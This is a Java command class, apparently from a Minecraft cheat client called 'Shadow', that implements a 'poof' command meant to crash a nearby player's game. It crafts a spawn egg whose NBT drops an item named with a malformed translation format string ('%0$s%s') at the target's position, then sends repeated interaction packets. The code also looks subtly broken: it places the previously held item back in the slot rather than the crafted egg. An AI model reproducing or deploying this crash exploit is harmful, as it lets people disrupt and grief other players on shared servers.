package net.shadow.feature.command;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.entity.Entity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.text.TranslatableText;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.shadow.Shadow;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.CreativeUtils;
import net.shadow.utils.PlayerUtils;

public class PoofCmd extends Command {
    public PoofCmd() {
        super("poof", "crash someones game");
    }

    @Override
    public void call(String[] args) {
        if (!Shadow.c.player.getAbilities().creativeMode) {
            ChatUtils.message("You must be in creative mode");
            return;
        }
        if (args.length < 1) {
            ChatUtils.message("Incorrect usage, please use >poof <player>");
            return;
        }
        String plr = PlayerUtils.completeName(args[0]);
        Entity target = PlayerUtils.getEntity(plr);
        if (target == null) {
            ChatUtils.message("Player not in range, you have to be close to them");
            return;
        }
        ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG, 1);
        ItemStack before = Shadow.c.player.getMainHandStack();
        try {
            item.setNbt(StringNbtReader.parse("{EntityTag:{Pos:["+target.getX()+", "+target.getY()+", "+target.getZ()+"],id:\"minecraft:item\",Item:{id:\"minecraft:iron_hoe\",Count:1b,tag:{display:{Name:'{\"translate\":\"%0$s%s\"}'}}}}}"));
        } catch (CommandSyntaxException e) {
            e.printStackTrace();
            System.exit(1);
        }
        CreativeUtils.setSlot(36 + Shadow.c.player.getInventory().selectedSlot, before);
        for(int i = 0; i < 10; i++){
            Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, (BlockHitResult) Shadow.c.crosshairTarget));
        }
        ChatUtils.message("Crashed " + plr);
    }
}